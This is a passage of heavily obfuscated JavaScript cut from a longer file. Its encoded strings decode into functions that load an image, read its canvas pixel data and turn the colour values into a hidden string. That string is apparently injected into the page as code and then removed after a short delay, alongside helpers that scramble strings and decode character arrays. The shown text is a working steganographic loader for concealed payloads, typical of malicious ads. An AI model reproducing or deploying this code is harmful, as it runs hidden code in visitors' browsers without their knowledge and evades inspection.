a.$$$_ + '[\\' + a.__$ + a.___ + a.$$_ + '];\\' + a.__$ + a._$_ + a.__ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$$$ + a.__$ + '\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.___ + a._$_ + '\\' + a.__$ + a.$$$ + a._$_ + '(\\' + a.__$ + a.$_$ + a.$$_ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.__$ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$_ + a.__$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$__ + '\\' + a.__$ + a.$__ + a.$$$ + '(\\' + a.__$ + a._$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + a.__ + '\\' + a.__$ + a._$_ + a.$__ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$_$ + a.$$$_ + a._$ + a._ + a.__ + '(' + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '()\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$_ + a.__$ + '.\\' + a.__$ + a.$$_ + a.___ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + '\\' + a.__$ + a.__$ + a.$$_ + a._$ + a.$$_$ + a.$$$_ + '.\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$_$ + a._$ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$$$_ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.__$ + a.$_$ + a.__$ + (![] + '')[a._$_] + a.$$_$ + '(\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$_ + a.__$ + ')\\' + a.__$ + a._$_ + '},\\' + a.$__ + a.___ + a.__$ + a.$__$ + a.$$$ + ')\\' + a.__$ + a._$_ + '}\\' + a.$__ + a.___ + a.$$__ + a.$_$_ + a.__ + a.$$__ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.$__ + a.___ + '(' + a._$ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '};\\' + a.__$ + a._$_ + a.$$$_ + '[\\' + a.__$ + a.__$ + a.$_$ + '](\\"\\")\\' + a.__$ + a._$_ + '};\\' + a.__$ + a._$_ + '"')())(), J.Qj = function(c, d) {
        var a = ~[];
        a = {
            ___: ++a,
            $$$$: (![] + '')[a],
            __$: ++a,
            $_$_: (![] + '')[a],
            _$_: ++a,
            $_$$: ({} + '')[a],
            $$_$: (a[a] + '')[a],
            _$$: ++a,
            $$$_: 'true' [a],
            $__: ++a,
            $_$: ++a,
            $$__: ({} + '')[a],
            $$_: ++a,
            $$$: ++a,
            $___: ++a,
            $__$: ++a
        }, a.$_ = (a.$_ = a + '')[a.$_$] + (a._$ = a.$_[a.__$]) + (a.$$ = (a.$ + '')[a.__$]) + (!a + '')[a._$$] + (a.__ = a.$_[a.$$_]) + (a.$ = 'true' [a.__$]) + (a._ = 'true' [a._$_]) + a.$_[a.$_$] + a.__ + a._$ + a.$, a.$$ = a.$ + 'true' [a._$$] + a.__ + a._ + a.$ + a.$$, a.$ = a.___[a.$_][a.$_], a.$(a.$(a.$$ + '"' + '\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a._$_ + a.$__ + '\\' + a.__$ + a.$$$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a._$_ + a.$__ + '\\' + a.__$ + a.$$$ + a._$_ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.$_$ + a.$$_ + ',\\' + a.$__ + a.___ + a._$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ',\\' + a.$__ + a.___ + a.$$$_ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$$$$ + a.$_$_ + (![] + '')[a._$_] + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(' + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$__ + a.$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$_$ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + '\\' + a.__$ + a.$$_ + a._$$ + '.' + (![] + '')[a._$_] + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.$__ + a.___ + '<\\' + a.$__ + a.___ + a.$_$ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + a.$$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$__ + a.$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$_$ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + '\\' + a.__$ + a.$$_ + a._$$ + '[' + a.__$ + '];\\' + a.__$ + a._$_ + a._$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.___ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a._$_ + a._$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '.\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$_$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '.\\' + a.__$ + a.$_$ + a.___ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$__ + a.$$$ + '\\' + a.__$ + a.$_$ + a.___ + a.__ + '\\' + a.__$ + a._$_ + '}\\' + a.$__ + a.___ + a.$$$_ + (![] + '')[a._$_] + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + '\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + a._$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a._$ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + a.___ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a.$_$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + a.___ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a._$_ + a._$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '.\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$_$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '.\\' + a.__$ + a.$_$ + a.___ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$__ + a.$$$ + '\\' + a.__$ + a.$_$ + a.___ + a.__ + '\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.__$ + a.$$$ + '\\' + a.__$ + a.$$$ + a._$_ + '(\\' + a.__$ + a._$_ + a._$$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.___ + a.$$_ + '.\\' + a.__$ + a.$$_ + a._$$ + a.__ + '\\' + a.__$ + a.$$$ + a.__$ + (![] + '')[a._$_] + a.$$$_ + '.\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$_$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + '\\"\\' + a.__$ + a.$$_ + a.___ + '\\' + a.__$ + a.$$$ + a.___ + '\\";\\' + a.__$ + a._$_ + '\\' + a.__$ + a.___ + a.$$_ + '.\\' + a.__$ + a.$$_ + a._$$ + a.__ + '\\' + a.__$ + a.$$$ + a.__$ + (![] + '')[a._$_] + a.$$$_ + '.\\' + a.__$ + a.$_$ + a.___ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$__ + a.$$$ + '\\' + a.__$ + a.$_$ + a.___ + a.__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + '\\"\\' + a.__$ + a.$$_ + a.___ + '\\' + a.__$ + a.$$$ + a.___ + '\\";\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.__$ + a._$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + '.\\' + a.__$ + a.$__ + a.$$$ + a.$$$_ + a.__ + '\\' + a.__$ + a.___ + a._$$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + a.$$$_ + '\\' + a.__$ + a.$$$ + a.___ + a.__ + '(\\"' + a._$_ + a.$$_$ + '\\");\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a.__$ + a._$$ + '.\\' + a.__$ + a.$__ + a.$$$ + (![] + '')[a._$_] + a._$ + a.$_$$ + a.$_$_ + (![] + '')[a._$_] + '\\' + a.__$ + a.___ + a._$$ + a._$ + '\\' + a.__$ + a.$_$ + a.$_$ + '\\' + a.__$ + a.$$_ + a.___ + a._$ + '\\' + a.__$ + a.$$_ + a._$$ + '\\' + a.__$ + a.$_$ + a.__$ + a.__ + a.$$$_ + '\\' + a.__$ + a.__$ + a.$$$ + '\\' + a.__$ + a.$$_ + a.___ + a.$$$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$_$_ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\"' + a.$$__ + a._$ + '\\' + a.__$ + a.$$_ + a.___ + '\\' + a.__$ + a.$$$ + a.__$ + '\\";\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a.__$ + a._$$ + '.' + a.$$__ + (![] + '')[a._$_] + a.$$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a._$_ + a._$_ + a.$$$_ + a.$$__ + a.__ + '(' + a.___ + ',\\' + a.$__ + a.___ + a.___ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a.__$ + a._$$ + '.' + a.$$_$ + '\\' + a.__$ + a.$$_ + a._$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.__$ + a.__$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$_$ + a.$_$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.$$$_ + '(\\' + a.__$ + a.$_$ + a.$$_ + ',\\' + a.$__ + a.___ + a._$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ',\\' + a.$__ + a.___ + a.___ + ',\\' + a.$__ + a.___ + a.___ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '$\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.__$ + a._$$ + '.\\' + a.__$ + a.$__ + a.$$$ + a.$$$_ + a.__ + '\\' + a.__$ + a.__$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$_$ + a.$_$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.$$$_ + '\\' + a.__$ + a.___ + a.$__ + a.$_$_ + a.__ + a.$_$_ + '(' + a.___ + ',\\' + a.$__ + a.___ + a.___ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + a.$$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '$.' + a.$$_$ + a.$_$_ + a.__ + a.$_$_ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a.$$_ + '_\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + a.$$$ + '.' + (![] + '')[a._$_] + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a._$ + '\\' + a.__$ + a._$$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '[];\\' + a.__$ + a._$_ + a.$$$$ + a._$ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.__$ + a.__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.___ + ';\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.__$ + a.__ + '\\' + a.$__ + a.___ + '<\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a.$$_ + '_;\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.__$ + a.__ + '\\' + a.$__ + a.___ + '+=\\' + a.$__ + a.___ + a.$__ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '_' + a.$$_$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + a.$$$ + '[\\' + a.__$ + a.___ + a.__$ + a.__ + '];\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.__$ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + a.$$$ + '[\\' + a.__$ + a.___ + a.__$ + a.__ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + a.__$ + '];\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a.$$$_ + '\\' + a.__$ + a.___ + a.__$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + a.$$$ + '[\\' + a.__$ + a.___ + a.__$ + a.__ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + a._$_ + '];\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a.$$_ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + a.$$$ + '[\\' + a.__$ + a.___ + a.__$ + a.__ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + a._$$ + '];\\' + a.__$ + a._$_ + '_' + a.$$_$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '_' + a.$$_$ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.__$ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.__$ + a.$$_ + '\\' + a.$__ + a.___ + '<<\\' + a.$__ + a.___ + a.$___ + ';\\' + a.__$ + a._$_ + a.$$$_ + '\\' + a.__$ + a.___ + a.__$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$$$_ + '\\' + a.__$ + a.___ + a.__$ + '\\' + a.$__ + a.___ + '<<\\' + a.$__ + a.___ + a.__$ + a.$$_ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.__$ + a.__$ + a.___ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '_' + a.$$_$ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.__$ + a.$$_ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + a.$$$_ + '\\' + a.__$ + a.___ + a.__$ + '\\' + a.$__ + a.___ + '&\\' + a.$__ + a.___ + a.__$ + a.$$_ + a.$$$ + a.$$$ + a.$$$ + a._$_ + a.__$ + a.$_$ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(' + a.$_$_ + '\\' + a.__$ + a.__$ + a.___ + '\\' + a.$__ + a.___ + '===\\' + a.$__ + a.___ + a.___ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + a.$_$$ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + a.$_$_ + '\\' + a.__$ + a.$_$ + a._$$ + '\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + a._$ + '\\' + a.__$ + a._$$ + a._$_ + '.\\' + a.__$ + a.$$_ + a.___ + a._ + '\\' + a.__$ + a.$$_ + a._$$ + '\\' + a.__$ + a.$_$ + a.___ + '(\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.$$_ + a.__$ + a.___ + '(' + a.$_$_ + '\\' + a.__$ + a.__$ + a.___ + '))\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$_$ + a._$ + '\\' + a.__$ + a.$$_ + a.$$$ + '[\\"' + a.$$_$ + a.$$$_ + a.$_$$ + a._ + '\\' + a.__$ + a.$__ + a.$$$ + '\\"])\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a.__$ + a._$$ + '.' + a.$$__ + (![] + '')[a._$_] + a.$$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a._$_ + a._$_ + a.$$$_ + a.$$__ + a.__ + '(' + a.___ + ',\\' + a.$__ + a.___ + a.___ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ');\\' + a.__$ + a._$_ + a._$ + '\\' + a.__$ + a._$$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a._$ + '\\' + a.__$ + a._$$ + a._$_ + '.\\' + a.__$ + a.$_$ + a._$_ + a._$ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$$_ + '(\\"\\");\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(' + a.$$$_ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + a.$$$_ + '(' + a._$ + '\\' + a.__$ + a._$$ + a._$_ + ')\\' + a.__$ + a._$_ + '}\\' + a.$__ + a.___ + a.$$$_ + (![] + '')[a._$_] + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + '\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.___ + a.$__ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.___ + a._$$ + '(' + a._$ + '\\' + a.__$ + a._$$ + a._$_ + ',\\' + a.$__ + a.___ + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a._$_ + a.$_$ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + a.__ + '\\' + a.__$ + a._$_ + a.$__ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$_$ + a.$$$_ + a._$ + a._ + a.__ + '(' + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '()\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a._$_ + a.$_$ + '.\\' + a.__$ + a.$$_ + a.___ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + '\\' + a.__$ + a.__$ + a.$$_ + a._$ + a.$$_$ + a.$$$_ + '.\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$_$ + a._$ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$$$_ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.__$ + a.$_$ + a.__$ + (![] + '')[a._$_] + a.$$_$ + '(\\' + a.__$ + a._$_ + a.$_$ + ')\\' + a.__$ + a._$_ + '},\\' + a.$__ + a.___ + a.__$ + a.$__$ + a.$$$ + ')\\' + a.__$ + a._$_ + '})\\' + a.__$ + a._$_ + '}\\' + a.$__ + a.___ + a.$$$_ + (![] + '')[a._$_] + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + '\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a._ + '\\' + a.__$ + a._$$ + a.__$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$__ + '\\' + a.__$ + a.$__ + a.$$$ + '(' + a._$ + '\\' + a.__$ + a._$$ + a._$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + a.__ + '\\' + a.__$ + a._$_ + a.$__ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$_$ + a.$$$_ + a._$ + a._ + a.__ + '(' + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '()\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + a._ + '\\' + a.__$ + a._$$ + a.__$ + '.\\' + a.__$ + a.$$_ + a.___ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + '\\' + a.__$ + a.__$ + a.$$_ + a._$ + a.$$_$ + a.$$$_ + '.\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$_$ + a._$ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$$$_ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.__$ + a.$_$ + a.__$ + (![] + '')[a._$_] + a.$$_$ + '(' + a._ + '\\' + a.__$ + a._$$ + a.__$ + ')\\' + a.__$ + a._$_ + '},\\' + a.$__ + a.___ + a.__$ + a.$__$ + a.$$$ + ')\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '};\\' + a.__$ + a._$_ + '"')())();
        var b;
        return typeof c == 'string' ? (b = new Image(), b.onload = function(b) {
            var a = b.target;
            J.Tz(a, d)
        }, b.src = c) : (b = c, J.Tz(b, d)), !0
    }, J.gi = function(b, c) {
        var a = function(h, e) {
            e = e || 3;
            var b = h.length,
                f = [],
                g, c = Math.max(1, b / e >> 0);
            for (var a = 0; a < b; a += c) {
                a + c >= b ? g = b - 1 : g = a + c - 1;
                for (var d = g; d >= a; d--) f.push(h[d])
            }
            return f.join('')
        };
        return a(b, c)
    }, J.k3 = function(a) {
        a = a.target;
        var b = J.UE([121, 13, 12, 22, 28, 20, 16, 45, 13, 28]);
        A[b](function() {
